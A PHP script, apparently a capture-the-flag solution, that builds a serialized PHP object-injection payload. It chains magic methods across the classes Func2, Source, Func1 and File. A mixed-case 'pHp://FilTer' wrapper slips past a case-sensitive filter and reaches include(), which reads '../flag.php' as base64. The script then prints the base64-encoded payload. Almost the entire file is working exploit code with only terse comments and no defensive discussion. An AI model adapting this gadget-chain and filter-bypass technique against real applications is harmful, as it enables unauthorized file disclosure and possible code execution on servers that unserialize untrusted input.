<?php

class File {
	public $file;

	public function __toString() {
		if (!preg_match('/^(http|https|php|data|zip|input|phar|expect):\/\//', $this->file)) {
			include($this->file);
		}
		return "Ahihhii";
	}
}


class Url {
	public $url;

	public function __construct($url) {
		$this->url = $url;
	}

	public function checkUrl() {
		if (preg_match('/[http|https]:\/\//', $this->url))
			return true;
		else
			return false;
	} 
}


class Func1 {
	public $param1;
	public $param2;

	public function __get($key) {
		$key = $this->param2;
		return $this->param1->$key();
	}
}

class Source {
	public $source;

	public function __construct($s) {
		$this->source = $s;
	}
	public function __invoke() {
		return $this->source->method;
	}
}


class Func2 {
	public $param;

	public function __wakeup() {
		$function = $this->param;
		return $function();
	}
}
$f= new File(); //__tostring
$f->file = 'pHp://FilTer/convert.base64-encode/resource=../flag.php'; // include flag.php được convert sang base64


$func1= new Func1(); // goi tu source qua __get
$func1->param1 = $f;
$func1->param2 = '__toString';


$src = new Source($func1); // goi tu func2 qua __invoke

$func2 = new Func2(); //_wakeup
$func2->param = $src;


$payload = serialize($func2); 
//var_dump((serialize($payload)));
echo base64_encode($payload);

?>